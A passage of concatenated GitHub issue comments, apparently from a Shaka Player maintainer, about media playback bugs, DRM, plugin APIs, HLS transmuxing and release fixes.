MediaSource through flash.  We only maintain our own polyfills for the browsers we directly support, all of which have MSE.\nIf you have access to a flash-based MSE implementation, you can always load that in addition to Shaka Player.  So long as shaka.Player.isBrowserSupported() returns true before you create a Player, it should work.\nDoes this help?. I'm not sure if I understand you.  Do you mean that you want to get media data from some custom piece of code, rather than directly from the network?. We have many plugin interfaces you may want to explore: https://shaka-player-demo.appspot.com/docs/api/tutorial-plugins.html\nManifest parser plugins would allow you to source your media metadata from something other than DASH or HLS.  We don't care where the info comes from, but we need metadata in a certain format to allow us to generically stream the content and feed it to the browser using MediaSource.\nNetworking plugins allow you to provide data from a source other than HTTP.  You register your plugin to handle a certain URI scheme, and Shaka Player will invoke your plugin any time it wants data from a URI using that scheme.  For example, you could ask Shaka to load media from myapp://foo/bar, and we would invoke the \"myapp\" plugin to get the actual data.\nDoes this help?. Happy to help!. Filed an issue on Chromium to fix at a platform level as well: https://bugs.chromium.org/p/chromium/issues/detail?id=728294. Quickest repro steps for Shaka Player:\n\nOpen the demo app and the JS console\nSelect any clip (Heliocentrism is shortest)\nClick \"Load\"\nPlay the clip to the end\nSelect any other clip\nClick \"Load\"\n\nYou will see in the console:\njs\nUncaught (in promise) DOMException: The play() request was interrupted by a new load request.. Cherry-picked to v2.1.3.. Looks like this was caused by PR #815.  I mistakenly disabled the relevant tests in c263e0bb.  I should have realized that we broke it, but I was distrustful of a failure from a third-party server.\nI'll see what I can do to fix it.  Thanks!. Cherry-picked to v2.1.3.. I'm running tests right now.  Assuming they pass, we'll wait for final approval from @TheModMaker.  Thanks!. The fix has been cherry-picked for v2.1.6.. I'm not convinced that this is the correct solution to your problem.\nresumeAt is meant to override the playhead time when we are switching periods.  It's an indirect solution to #715, and was introduced in 2cc68b20.\nOnce we have consumed resumeAt, it should be reset to 0.  It is used like Math.max(playheadTime, resumeAt) to decide what to stream next, so if it is never reset, I think it could cause issues when seeking.\nCan you produce a failing unit test that demonstrates the bug you're trying to fix?  That might help us understand and fix your issue.. The fix for this has been cherry-picked and will be released in v2.1.5.. If you can provide samples and point us to a spec, we could evaluate the format and make a decision based on that.  Thanks!. Please send private links to shaka-player-issues@google.com so the whole team gets them.  Thanks!. Cherry-picked to v2.1.3.. Cherry-picked to v2.1.3.. Can you rebase your changes?. Okay.  Whatever works best for you.  Thanks for contributing!  I'll keep an eye out for the next PR.. We have never tested with Cordova, but you can load this page to get a full report:  https://shaka-player-demo.appspot.com/support.html\nPlease paste the contents of that page into a reply so we know what does or doesn't work!. Closing due to inactivity.  We can reopen at any time if you need further assistance.. I don't see any reason you couldn't do this.  My team does not have time to do this, but we'd be happy to give you advice if you want to build a plugin for this.  In Shaka Player's architecture, this would be a response filter that translates flv into mp4.\nBefore you dive into such a project, though, I think it's worth asking: If your only format is FLV, why not use flv.js directly?  It sounds like it already does everything you need.. Yes, you would need a receiver that can also play FLV.  If you build a plugin for Shaka Player, you can build a Shaka-based receiver as well and use the same plugin on the Chromecast.  We have library support for both sender and receiver.. Let us know if you plan to send a PR or if you need any help building a plugin.  Or if you decide not to work on this, we can go ahead and close the issue.  Thanks!. Looks good to me.  I'll have the build bot test it.. Cherry-picked to v2.1.3.. I see no reason you couldn't do this.  What browsers support it?  What devices support it, other than Chromecast?  Does Chromecast support it as well?. If the browser behavior is to-spec, then we should reverse the order of the cues before sending them to the browser.. We've pushed a fix to master for the case where line=auto, but we will leave this issue open a little longer until we can determine what the issue is in other cases.. I'm unable to reproduce any issue in Chrome's support of line=.\nI've tested line=-1, -2, -3 with snapToLines=true and line=10, 20, 30 with snapToLines=false.  In all cases, in any insertion order, the display is correct.\nIf you see any further issue with this, please let us know and we can reopen.. Fix backported to v2.1.6.. @aaani, I think this might be the wrong forum for this question.  Shaka Player can't control this at all.  You are interested in features of the license proxy and CDM, but Shaka Player just sits in between the two (on top of the browser & CDM) and can't see any DRM-vendor-specific features.  I suggest contacting Widevine support directly.. If the keys are in the clear anyway, we could look into WebCrypto APIs: http://caniuse.com/#feat=cryptography. Parsing of segment start times is something we do now, but we could probably avoid in many cases.  That is something we're planning for a future release, likely v2.6 or v2.7.\nAside from that, though, you're right.  We could probably detect and reject AES-128 content with a meaningful error code instead of failing to parse it.. TS content should also work in MS Edge.. This plays fine in Edge.  This is likely a duplicate of #743.  I've bumped 743 up in the milestones to v2.3.0, and I'm closing this as a duplicate.  @sirpy, please subscribe to #743 for updates.  Thanks!. The header is added, though.  See https://github.com/google/shaka-player/blob/9d9d1c70/lib/media/drm_engine.js#L1153. I did some debugging on a Chromecast and found that we never entered that method.  It should be easy to fix.  Sorry for the inconvenience.. I can't reproduce.  Since we just pushed this version to the server, can you try clearing your browser cache and reloading?. Moving this to the backlog, since it does not appear to be available from the browser yet.. This should be available now, so we just need to decide how our behavior will differ when the user enables data-saver mode.. When the browser indicates that we should save data, we will default AbrManager's restrictions object to a max height of 360.  Apps can still override this, and users can still select higher resolution tracks when ABR is disabled.  The restrictions object will be treated as \"soft\" restrictions, meaning that if the restrictions cannot be met, we will not fail playback.. Cherry-picked for v2.3.9 and v2.4.1.. I can reproduce this easily, but we need to investigate more to decide how we could solve this.. Explicit sounds like too much effort for the app developer.  If we can do it at all, I believe in this case it should be implicit.\nIf the app selects a specific variant (low res, for example) and disables ABR (as the demo does when you select a variant), then it is a surprise to the app developer (and therefore end user) when the res changes to something higher on language change.  Even though the user has enough bandwidth, this change in res is essentially an automated one, which is surprising when ABR is turned off.  We should, as much as we can, avoid surprising devs & end-users.\nThis could be a little tricky to fix, since the system behaves very generically today.  If there's a language change, AbrManager is given new things to choose from and makes a choice.  It all follows from simple rules.\nTo fix it, we may have to give AbrManager some guidelines or restrictions, or perhaps even cut AbrManager out of the loop entirely on language changes if ABR is disabled.  This means more complex rules for this action.  Hopefully, we could avoid surprises while also avoiding undue complexity.  We'll have to see what we can do.. This is complicated.\nWith ABR disabled, we could try to maintain the previous resolution or bitrate whenever we are forced to select new streams.  This would apply both to language changes as in @yairans's scenario, and to period changes as described by @TheModMaker.  But this will not always produce good results.\nAssume the following perfectly reasonable-looking periods, in which not all resolutions are available across periods:\nperiod 1 - TV show: 1080p (selected by user), 720p, 480p\nperiod 2 - ad break: 480p only\nperiod 3 - TV show: 1080p, 720p, 480p\nWhen switching to period 2, we can only choose 480p.  There are no other streams.  When switching to period 3 with ABR disabled, we would stick with 480p in period 3, even though we might have been forced into 1080p by the user during period 1.\nThis solution could be as surprising to the user as the bug, but at least now we will not ever choose a resolution for which we don't have enough bandwidth.  Imagine the inverse of the above periods:\nperiod 1 - TV show: 1080p, 720p, 480p (selected by user)\nperiod 2 - ad break: 720p only\nperiod 3 - TV show: 1080p, 720p, 480p\nHere we would wind up at 720p in period 3, even though the user forced the player into 480p in the first period.  In period 3, we may end up buffering a lot and never switching down to 480p.  This is clearly worse than choosing new streams at the period transition based on current bandwidth.\nI feel as though this applies to language transitions as well as period transitions, but I'm not certain.. In the multi-period scenarios, fundamentally, there seems to be a conflict between what you intend to do (choose a particular resolution) and what the API says (choose a particular track).  Tracks do not extend across periods, and we don't have a \"choose resolution\" method.\nFor languages, it may be easier to resolve.  The best-effort \"maintain bitrate\" goal I suggested above may be good enough if applied solely to selectLanguage().  I will experiment with this.. If the user has selected a particular resolution, it may be a reasonable work-around for applications to listen for TracksChangedEvent and then call selectVariantTrack() with the best match to the user's selection in the app's UI.  This would work for both language and period transitions.\nIt would still be best for the Player to handle this, but it's complicated by the lack of a clear intent to stick to a given resolution.  Again, because selectVariantTrack() does not mean \"select resolution\", and tracks don't extend to other periods or languages.. We don't have an API for this currently.  Could you help us understand the reason for this functionality?  Why is it useful to know that in your application?. Instead of replacing global XHR, I would strongly recommend replacing Shaka Player's HTTP implementation instead.  Our HTTP implementation is just a default plugin.  You can register your own HTTP plugin and replace ours.  See lib/net/http_plugin.js.  You simply have to provide a method which takes a URI and a Request object and returns a Promise to a Response object.  Then register it as you see at the bottom of our default plugin:\njs\nshaka.net.NetworkingEngine.registerScheme('http', P2PHttpPlugin);\nshaka.net.NetworkingEngine.registerScheme('https', P2PHttpPlugin);\nWould this more direct integration help at all with your stats gathering?. We don't have anything like this today.  I've marked it as an enhancement and added it to the backlog.  If you would like to submit a PR, I would be happy to talk design.. You should already be able to do this through a callback.  We have a <ContentProtection> callback for DASH that allows you to parse custom attributes/elements from the manifest and provide us with a DrmInfo object, which can include the license server URI.\nHere are the docs on the DASH configuration, including the callback you can use: https://shaka-player-demo.appspot.com/docs/api/shakaExtern.html#DashManifestConfiguration\nIf there's a particular common (if non-standard) format you want us to support, support could be added to the manifest parsers.. See also #484. No, Widevine does not have any recommended extensions to DASH.. Given #824, where we can't switch to audio-only variants anyway, we should probably solve both problems at one by filtering out audio-only variants in cases where there are audio+video variants available.. The fix for this has been cherry-picked and will be released in v2.1.5.. Great advice.  Thanks!. The changes to the docs have been cherry-picked and will be released in v2.1.5.. Yes, that is definitely a mistake we made in our release process.  The build was done before the tag was created, which caused the released build to have the wrong version number.\nI went back through previous releases and found that v2.0.3 and v2.0.4 also had a bad version number in the binary.\nI will see what I can do to fix the process for future releases, and I will try to find a way to fix the three builds that are already out with the wrong version numbers: v2.1.3, v2.0.4, v2.0.3.. I will not be able to fix the version in the builds that went out via npm.  According to the docs on npm publish:\n\nOnce a package is published with a given name and version, that specific name and version combination can never be used again, even if it is removed with npm-unpublish.\n\nI may be able to fix what's in CDNJS and Google Hosted Libraries.. The versions in Google Hosted Libraries are already correct.  (Those go through a different release process that is not driven by npm.)\nSo it is only npm (which we can't fix) and CDNJS (which I am working to fix).\nWe have fixed our npm release scripts to avoid this issue in future.. According to @PeterDaveHello in https://github.com/cdnjs/cdnjs/pull/11396#issuecomment-308197262, we can't update what's in CDNJS.  So there's nothing more we can do.\nI apologize for the error in those releases.  We have fixed our processes so it should not happen again.  Builds on Google Hosted Libraries are not affected, but builds on NPM and CDNJS are.. The right thing to do in the case, according to DASH, is for the server to respond with 404.  HTTP 400 would mean the request itself was malformed.  If the segment is simply not ready yet, 404 is the correct response and will result in a retry inside the Player.. What server are you using?  We would be happy to help you file a bug against the server folks.. Closing due to inactivity.. Your proposal to use npm version here sounds reasonable to me.  The version comes from calculate_version() in build/shakaBuildHelpers.py.  Perhaps git_version() could fail when there is no .git in the source base.. The fix for this has been cherry-picked and will be released in v2.1.5.. At a glance, it seems like a great idea!  In particular because of the lack of availability of persistent license support and because of the incredibly low bandwidth requirement for licensing.\nLet us know if you have any questions as you work on the PR.  My gut instinct is to either add a parameter to store or to add an option to storage.configure.\nThanks for the suggestion, and for offering to contribute!  We really appreciate it.. I took a look and left some comments.  In short, I think configuration is better in this case.  I can't see any reason you would need to change that flag per-asset, and if you need to, you still can through configure().\nThanks again for working on this!. Okay, sounds good.  We can continue discussion on the PR.. Reopening.  Just noticed that we didn't update the configuration structure definition to include the new flag.  I'll fix it shortly.. I am also renaming the option from isPersistentLicense to usePersistentLicense, which makes more sense to me as a directive for the library's behavior.. No, I'm taking care of it real quick.  Sorry about that.  I should have noticed these things before merging.  :-). Thanks!  I'll have to do some manual testing on Android to verify.. My pleasure.  Thank you for trying to help us improve!. I'm always open to improvements, but FWIW, I'm also content with the solution we implemented in 53220b5acb6192f783a4a5e1b860393c45adba6a to silence the logs while still passing through the rejected Promise for anyone who wants to handle those errors.. @beaufortfrancois, are you still planning to revise this?  Or can we go ahead and close it?. @theifish, can you please confirm your Shaka Player version?  v2.3 does not exist yet.\nIf you are using our demo app, you can see the version number at the top of the page.  Otherwise, check shaka.Player.version in the JS console.\nI can confirm the behavior, and that there are no subtitles according to the parsed manifest.. This appears to be a very small bug in the DASH parser.  Should be easy to fix.. This is caused by the fact that mimeType appears on AdaptationSet, but codecs appears on Representation.  We have not seen this before.  Usually, these attributes would appear on the same element.  @theifish, can you tell us which encoder/packager you are using?. @kuznetcoff777, the initial fix we made for this came out in v2.1.4.  We just released v2.1.6 which includes a fix for #919, which may explain subtitles downloaded and never displayed.  v2.2.0 will be out as soon as we resolve #960.\nPlease let us know whether v2.1.6 and the fix for #919 resolve your missing subtitle issue.  Thanks!. @theifish, the JavaScript compiler we use is written in Java.  We have a brief mention of this in the README:\n\nIn order to build, you simply need python v2.7 (for the build scripts) and JRE 7+ (for the compiler).\n\nGlad to know the issue is now resolved for you.  Thanks for retesting!. The issue with \"Car ClearKey\" appears to be a bug in the content's manifest.  They use \"mp4a.40.02\" instead of \"mp4a.40.2\".  Chrome accepts both, but Firefox only accepts the latter.\njs\nconsole.log('40.02', MediaSource.isTypeSupported('audio/mp4; codecs=\"mp4a.40.02\"'));\nconsole.log('40.2', MediaSource.isTypeSupported('audio/mp4; codecs=\"mp4a.40.2\"'));\nWith \"Angel One ... ClearKey server\", I get different results from either of you.  For me, the content loads, then starts showing decode errors at 11 seconds:\nhttps://shaka-player-demo.appspot.com/demo/#asset=//storage.googleapis.com/shaka-demo-assets/angel-one-clearkey/dash.mpd;lang=en-US;noadaptation;play\nThat same link fails for me in Chrome, too.\nThe Widevine version of the same works in Chrome, but fails in Firefox:\nhttps://shaka-player-demo.appspot.com/demo/#asset=//storage.googleapis.com/shaka-demo-assets/angel-one-widevine/dash.mpd;lang=en-US;noadaptation;play\n@cpeterso, in Chrome, I am accustomed to using chrome:media-internals to look at what the media stack is doing and see more detailed errors.  What is the equivalent in Firefox?  If I ever knew, I must have forgotten.. I'm running Firefox 54 on Ubuntu Linux.. Although I didn't check this morning what version I was.  After opening Firefox again, I'm definitely running 54 this time, and the error on the \"Clear Key server\" asset is gone.  Perhaps I got upgraded from 53 to 54 in the last 2 hours.\nNo issue with the Widevine version now, either.\nThis means the only remaining issue seems to be that the YouTube \"Car\" video doesn't play due to the codecs string being set to \"mp4a.40.02\":\nhttps://shaka-player-demo.appspot.com/demo/#asset=//yt-dash-mse-test.commondatastorage.googleapis.com/media/car_cenc-20120827-manifest.mpd;lang=en-US;play\n@cpeterso, since you've filed Firefox bug 1373314, I'm going to mark this as \"external bug\" and follow along there.\nAlso, thanks for the tip on about:media.  It looks very useful, and I've installed it for next time I run into a decoder error.\n@dannyfinks, does this help?. Thanks!  Note that Firefox 56 is currently scheduled for beta on 2017-08-08, and for stable release on 2017-09-26.. Firefox 56 is stable.  Closing.  Thanks all!. Updated to include both background sync and background fetch as tools we may want to use for this, and closing #881 as a duplicate.. Issues implementing background fetch & sync so far:\n - BG fetch is behind a flag in Chrome 61, experimental web platform features must be enabled explicitly.  Expected at this stage, but worth noting.\n - navigator.serviceWorker provides no consistent indication of service worker existence.  Sometimes, controller is null even when a SW is registered.  Sometimes, controller becomes non-null after reloading the page.  This means that we will need an app-level configuration to instruct us to try BG fetch in the first place, since we can't detect the SW.\n - navigator.serviceWorker.ready never resolves on localhost over http.  It does on appspot over https.  This means we can't reliably grab a reference to the SW registration, even asynchronously.  Saving the reference in the app level after initial registration allows me to work around this for development purposes, but this is going to complicate library APIs for BG fetch.  If this is consistently the case, we will have to have applications pass in a reference to the SW registration before we can use BG fetch.\n - At least on desktop Chrome 61 on Linux, the BG fetch API does not result in a network request.  Nothing shows up in the Network debug panel in Chrome.\n - At least on desktop Chrome 61 on Linux, the BG fetch API does not provide any way to access the fetch.  (May be related to the point immediately above.)  The BackgroundFetchRegistration object contains icons, tag, title, and totalDownloadSize.  The spec'd activeFetches does not appear.  There is no clear way to access the results of the fetch.\nGiven all of the above, I am moving this issue to the backlog for now.. According to Chrome team, background fetch is not ready for production yet.  Leaving this issue on the backlog until that changes.. Hi @chrisfillmore, @bennypowers,\nSince #1087, a video element is no longer required in the constructor, but it must be attached by the time load() is called.  I do not expect to change this, so that the meaning of load() will continue to be \"load all into MediaSource\".\nFor preload, I am thinking along the lines of what Chris suggested in https://github.com/google/shaka-player/issues/880#issuecomment-360896727, where we return a token that can be used to complete the load process.  The player would be capable of starting multiple preloads in parallel, to support speculation about what the end-user will click on.  When the user finally clicks on a thing, you can then choose which preload to continue with.  The others would then be invalidated.\nMaybe something like this:\njs\nlet player = new shaka.Player();\nlet token1 = player.preload('foo1.mpd');\nlet token2 = player.preload('foo2.mpd');\nlet token3 = player.preload('foo3.mpd');\n// time passes...\nplayer.attach(video);\nawait token3.load();  // like player.load('foo3.mpd'), but we already fetched segments\n// tokens 1, 2, and 3 are all now invalidated.\n// buffered data in tokens 1 and 2 has been dropped.\n// buffered data in token3 has been transferred to Player and MediaSource.\nAs for Benny's suggestion in https://github.com/google/shaka-player/issues/880#issuecomment-365308775, Shaka Player does not buffer multiple independent ranges in general, so I don't plan to incorporate this into the preload design.\nThanks!. I can see how that might be useful for a TV-like scenario: you could keep the next and previous channel preloaded so the user could \"channel surf\" with low latency.\nBut, I wasn't thinking of how this would interact with live streams.  I was imagining that we could buffer up to rebufferingGoal and then stop.  For live streams, we would need to keep the manifest up-to-date and potentially continue buffering as the live edge moves.\nIt's not undoable, but I had envisioned something much smaller and simpler.  We'll need to give this some careful thought.\nWhat would your expectation be for having several tokens representing live streams?  What should they be doing while they wait for a call to load()?. Okay.  I was thinking of keeping the API as simple as possible.  Calling preload() would start buffering, and token.load() would fully connect the pipeline to MediaSource.\nIt seems like you're suggesting something more like this: preload() starts fetching and updating the manifest, token.startBuffering() would start buffering, and token.load() would then fully connect the pipeline.\nIs that right?\nIn this three-stage process, when would each stage be triggered by the app?  (Manifest, buffering, playback.)  I guess I'm having trouble understanding why buffering would need to be a separate stage.. In my plan, Player would have a preload() method alongside load().  Since there's no separate PreloadManager, there's no separate NetworkingEngine.  The preload() method would return an object that represents that particular preload operation, and allows you to upgrade any preload to a full-blown load().  If Player were destroyed, any associated preload object would be invalidated.. Quick update: based on our timeline for v2.6 in Q2 2019, we expect to be working on preload in Q3.  Refactors planned for v2.6 stand in the way of preload.. Closing as a duplicate of #879.. The fix for this has been cherry-picked and will be released in v2.1.5.. Also, when the video is put into fullscreen, the screen orientation should be forced into landscape mode.. Cherry-picked to v2.2.3.. I believe this is related to #890 and #891.  In all three issues, there is a lack of key status information.  We will try to address #890 first and see how well that work applies to Tizen.. The fix for this has been cherry-picked and will be released in v2.1.5.. We have an entry about this in the FAQ:\n\nQ: My HLS manifest doesn't load.\nA: If your HLS manifest describes MPEG2-TS content, the only browsers\ncapable of playing it are Edge, Chromecast and Safari. You will get an\nUNPLAYABLE_PERIOD error on other browsers due to their lack of TS support.\nWe also were not able to make it work on Safari yet due to a bug in their\nMediaSource implementation (#743).\nPlease file a issue if your TS content isn't playing in Chromecast or Edge\nand your MP4 content - on any browser.\n\nWe also recognize that this error message is confusing, and we have proposed a new error code in #868 that would make the problem more clear: CONTENT_NOT_SUPPORTED_BY_BROWSER.\nDoes this answer your question?. After some internal discussion, we have decided that this is consistently surprising to developers, and that we can do better.  I filed #887 for Shaka Player to convert TS to fMP4 so that we could play TS in all browsers.  I do not have a date when this would be ready, and we still have lots of research to do.\nFor now, this is working as intended, but we will look into TS transmuxing for the future.  I apologize for the inconvenience.. Let us know if we can do anything else for you, and feel free to follow #887 if you want to reconsider Shaka Player for HLS in the future.. I believe this will be handled by #796, in which we will provide a plugin interface for subtitle display after parsing.. I'm adding a requirement to #796 to make sure the text display plugin can know which Player it belongs to, and I'm closing this as a duplicate.  Thanks!. @forbesjo, thank you for the suggestion.  We will look into it!. We have decided to use https://github.com/videojs/mux.js as the basis of our transmuxing feature.\nHere's a rough outline:\nToday\n\nWe parse the manifest and create our internal data structures describing the content\nWe query the platform for the MIME types and codecs we find in the content\nIf the container isn't supported, the platform rejects the MIME type, and we reject the content\n\nWith transmuxing\n\nWe parse the manifest and create our internal data structures describing the content\nWe query the platform for the MIME types and codecs we find in the content\nIf the container isn't supported, we check if mux.js has been loaded\nIf mux.js is available and can demux the container, we install transmuxing filters, relabel the content as MP4, and try again\nTransmuxing filters will use mux.js to transmux each segment after download\n\nIf the application developer is not interested in transmuxing, no changes are required.  If the application developer wants TS transmuxing, they merely have to upgrade Shaka Player to v2.3+ and load mux.js in parallel with Shaka.\n@forbesjo, how does mux.js manage API changes?  If we ask our users to load mux.js, and we have tested with v4.1.5, will there be any breaking API changes in v4.2?  Should we advise them only to use specific versions?  What's the best way to stay informed of important changes to mux.js?. @forbesjo, thanks!. Just a quick status update: we are making good progress on transmuxing with mux.js, and we hope to publish something soon.. It seems that https://content.jwplatform.com/manifests/vM7nH0Kl.m3u8 contains raw AAC (no container), which we don't support in our parser yet.  I filed #1083 to improve this.\nThe other stream (http://vod.izzitv.mx/Content/HLS/VOD/IRIS_DLVY5849991423000097/ATEME_HLS_P_DLVY5849991423000097.m3u8) fails with an HTTP 403 error, even with mixed content restriccions disabled.. Yes, that's probably the issue.  We aren't doing proper URI parsing in the HLS parser when we use extensions to guess at MIME types.  Shouldn't be hard to fix, but it's a shame HLS can't just provide MIME types in the first place.. Filed #1085 to track the extension parsing issue.. Yes, we do, in the master branch and in the upcoming v2.3 release.  If the browser does not support TS, your application will need to load mux.js for transmuxing.  If mux.js is in the environment, Shaka Player will detect that and use it to transmux TS content automatically.  No other integration work is required.\nAnd you are right that our FAQ is out-of-date.  Thank you for bringing that to our attention.  I have filed https://github.com/google/shaka-player/issues/1183 to track updating the docs.. The compiled bundle is also minified.  We also ship a debug version (in which you can use source maps and set breakpoints) and the uncompiled library.\nSee these two tutorials for more details:\nhttps://shaka-player-demo.appspot.com/docs/api/tutorial-basic-usage.html  (shows use of the compiled library)\nhttps://shaka-player-demo.appspot.com/docs/api/tutorial-debugging.html  (shows use of the uncompiled library). Please try the latest release.  We fixed PlayReady-related issues in v2.1.3, and we just released v2.1.4 today.. Ah, that make sense.  This is probably a duplicate of #884, then, for a different platform.\nIf that is the case, I would expect playback to work on content where all video streams use the same key ID, or in cases where the key IDs are not in the manifest but all keys are returned in the license.\nOne way or another, we need to make sure Shaka Player works as well as it can without key statuses.. I believe the same root cause is at work in both this issue and #884, and that a solution to this will work around #891.. I'm sorry we haven't made a release lately.  Due to vacations and illness, I've been falling behind on things.  I believe this can be cherry-picked cleanly to v2.1.x and be released in v2.1.5, either this week or next week.. The fix for this has been cherry-picked and will be released in v2.1.5.. The tag is out, as is NPM.  I am still pushing the release out through other channels, after which I'll announce via email.  But you can go ahead with the github tag or NPM release.. Work-arounds are in place now, but we still have not been able to file bugs against Samsung/Tizen.  Having trouble getting an account on their JIRA instance.. Work-arounds have been cherry-picked and will be released in v2.1.5.. Tizen 3.0 web app user agent string, for reference:\nMozilla/5.0 (SMART-TV; LINUX; Tizen 3.0) AppleWebKit/538.1 (KHTML, like Gecko) Version/3.0 TV Safari/538.1. In the original failing test (\"Offline stores, plays, and deletes protected content\"), the platform doesn't fail the persistent license flow until the license response is given to the CDM.\nWe now have an additional failing test (new test added in #878):\n```\nOffline\n    \u2717 stores, plays, and deletes protected content with a temporary license\n    Error: Timeout - Async callback was not invoked within timeout specified by jasmine.DEFAULT_TIMEOUT_INTERVAL.\nSafari 3.0.0 (Tizen 3.0.0): Executed 1 of 1221 (1 FAILED) (skipped 1220) ERROR (2 mins 4.54 secs / 2 mins 0.032 secs)\n```\nWith logging turned on, the new failure shows the error \"Must not be destroyed\", which is ambiguous.. The new test is failing because DrmEngine.prototype.createOrLoad returns a Promise that is never resolved.  this.allSessionsLoaded_ for temporary sessions is only resolved through key status events.  We don't have those on 2017 Tizen TVs.  (#891). Work-arounds are in place now, but we still have not been able to file bugs against Samsung/Tizen.  Having trouble getting an account on their JIRA instance.. Work-arounds have been cherry-picked and will be released in v2.1.5.. We are glad we were able to help.  Thanks for letting us know that the problem is now resolved.. @mhassanist, to state it another way, TS content must be encrypted with a CBC scheme that is not widely supported by browsers.  MP4 content can be encrypted with a CTR scheme called cenc which is widely supported.  MP4 files should be preferred for compatibility with all browsers, and Shaka Packager can produce this kind of output.. @kqyang, can you assist with this Packager question?  @mhassanist is trying to create fMP4 HLS output for playback in Shaka Player.. It looks like you only put init_segment on the audio.  It must be in every stream.. Closing due to inactivity.  We can reopen at any time if you need further assistance.. I can reproduce on Chrome 59 with low res tracks, but not high res tracks.  So I think it was that Chrome bug.  We'll keep this open until the fix is in Chrome stable.. Chrome 61 is currently in beta, and is scheduled for stable release around September 5.. @kuznetcoff777, did you manage to resolve this?  Do you need further support from us on this issue?. @kuznetcoff777, JavaScript players do not generally have access to codec-level data.  The player feeds the media segments to the browser, which parses/demuxes them and decodes them.  There is nothing we can do in JavaScript to handle SEI.  If there is a conflict between SEI and the container, then I recommend you file a bug against your encoder for creating inconsistent metadata.  I am happy to assist with that if you need help.\nAs far as we can tell, availabilityStartTime is used by the player in a way that is consistent with the DASH spec.  Changing this field during a live stream is inconsistent with it's definition in the spec, so if your encoder does this, that seems like another encoder bug.\nIf there is anything we can do to help, please let us know.  For now, I am going to consider this issue closed.  We can reopen at any time if you wish.. Thank you, @BucherTomas.  @mhassanist, does this answer your question?. The fix for this has been cherry-picked and will be released in v2.1.5.. This did not reoccur in the subsequent 100+ nightly runs.  I'm running a stress test now to try to reproduce.. Unable to reproduce after 20 more runs.. @prasadkhambete, this https requirement is outside of our control.  The EME spec states that EME is only available from a secure context (https or localhost).  We just today added a new FAQ entry about this, closing #867.  The new entry will appear in the nightly build in a few hours, but I have reproduced it here for your convenience:\nEME and http URLs\nEME requires a secure URL to use.  This means you have to use https or be on localhost.  Currently only Chrome enforces it, but other browsers will in the future.  Also, because of mixed content requirements, if your site is using https, then your manifest and every segment will also need to use https too.\nSee: Chrome's announcement, Firefox's intent to remove, and how to disable for testing.\nfirefox_bug: https://bugzilla.mozilla.org/show_bug.cgi?id=1322517. Does this help?. Glad we could help!  Feel free to comment if you need anything else on this topic, and we can reopen the issue if needed.. Improvements after fixing render-blocking scripts:\n\nFirst meaningful paint: 660 ms\nPerceptual Speed Index: 1,982 (target: < 1,250). All touch event listeners are now marked explicitly with passive: false or passive: true.  This does not silence the warning from Lighthouse, though, since one of them is still non-passive.  It must remain so, since we call preventDefault() on the event.\n\nIssues have already been filed on both Chrome and Lighthouse to fix this and respect passive: false:\n - https://bugs.chromium.org/p/chromium/issues/detail?id=770208\n - https://github.com/GoogleChrome/lighthouse/issues/3137. The only remaining complaint from LightHouse is this one:\n\n\nReduce render-blocking stylesheets (these contribute 590 ms to load time)\n\n\nThis is caused by Google Web Fonts, which seem fundamentally at odds with best practices recommended by Lighthouse.  We will continue to use these fonts.. We shouldn't set any headers by default, primarily because of CORS.  If we make a request to a license server that is hosted in the same origin as the application, we can send whatever headers we want.\nIf the license server is cross-origin, any headers we send must be explicitly allowed by the server, and there is no good way for us to discover at runtime what headers are allowed.  If we send a header that isn't allowed by the server, the request fails and from the JS perspective, we don't know why.\nAccording to MDN, there are certain headers which are allowed by default, and Content-Type is one of them, but only with specific values:\n  - application/x-www-form-urlencoded\n  - multipart/form-data\n  - text/plain\nNone of these would be appropriate for a license request, which generically should be considered binary and use application/octet-stream if anything.\nBecause of these restrictions, any application whose server needs a specific Content-Type would have to:\n  - explicitly set headers['content-type'] in a request filter\n  - explicitly configure the server to provide the necessary CORS headers to allow Content-Type\nIf we can't control the server (which as client-side middle-ware, we can't), then setting a default Content-Type header could cause surprise failures for many applications.. I'm sorry that we have fallen behind in reviewing pull requests.  I promise to take a look at this as soon as I can make time.  Please accept my apologies for keeping you waiting for so long.. The fix for this has been cherry-picked and will be released in v2.1.5.. The fix for this has been cherry-picked and will be released in v2.1.5.. The fix for this has been cherry-picked and will be released in v2.1.5.. IE and Edge are correctly truncating the duration to the largest of the buffered ranges for audio & video.  It's not obviously a platform bug as we previously thought.. If we comment out setBuffering() in Playhead, the problem disappears.  This is called by PlayheadObserver, which calculates when we should or shouldn't be buffering.  So PlayheadObserver is sending Player into a buffering state on IE & Edge, when it shouldn't.\nIn this case, audio SourceBuffer ends at 634.35, video ends at 634.56, and duration is 634.56 (on all browsers).  On Chrome, video.buffered is (surprisingly) the larger of the two, while on IE it's the smaller of the two SourceBuffers.  This calculation:\njs\n  var atEnd = (bufferEnd >= duration) || this.video_.ended;\nis therefore true on Chrome and false on IE.. In PlayheadObserver, the local value duration is the video duration minus a fudge factor of 0.1 seconds (shaka.media.PlayheadObserver.FUDGE_FACTOR_), but the actual discrepancy for this content is 0.21 seconds.\nThe real source of truth is mediaSource.readyState, which is 'ended'.  Ideally, we would use this instead of comparing buffered ranges to the duration.. Cherry-picked for v2.1.7.. Fix cherry-picked for v2.1.6.. The fix has been backported for v2.1.6.. I've been through this with your demo, and I can see that it is definitely caused by a lack of duration in the trun box.  I checked the spec, and it seems like we should be using the default from the tfhd box in this case.  Let me see what I can do.. I'm also seeing warnings about unsupported settings because some of your samples use fractional values and our parser is expecting only integral values.  Should be easy to fix both.. Fix backported to v2.1.6.. We don't normally recommend building as root, but I'm glad you were able to solve it.  Is it okay to close this issue now, or is there something else we can do for you?. No worries!. Hi all, I am looking into this now.  I believe this issue, #762, and #937 are all one and the same.  I apologize for the delay.. When I set the timeout low (for my fast connection, this is 100ms), I definitely see requests being canceled and retried.  For VOD, this eventually leads to a timeout error and no more retries.  For live, the player keeps trying based on the infiniteRetriesForLiveStreams configuration.\nIs the issue that requests aren't being canceled?  Or that we (based on player.isLive() and configuration) may continue to try streaming?  You shouldn't see infinite retries for VOD.\nHow are you setting your retryParameters?  The retryParameters config exists separately for streaming, manifest, and drm requests.  This is the correct way to set it for streaming (segment requests):\n```js\n// In your own app:\nplayer.configure({\n  streaming: {\n    retryParameters: { timeout: 100 }\n  }\n});\n// In the JS console of the demo, before clicking the Load button:\ndebugConfig = {\n  streaming: {\n    retryParameters: { timeout: 100 }\n  }\n};\n```\nThis would result in an error log of Invalid config, unrecognized key .retryParameters:\njs\nplayer.configure({\n  retryParameters: { timeout: 100 }\n});\nIf you are using a compiled build, you are missing those error logs.\nDoes any of this help?. I've also tagged you all in #960, in which I've proposed a general solution to retry behavior.  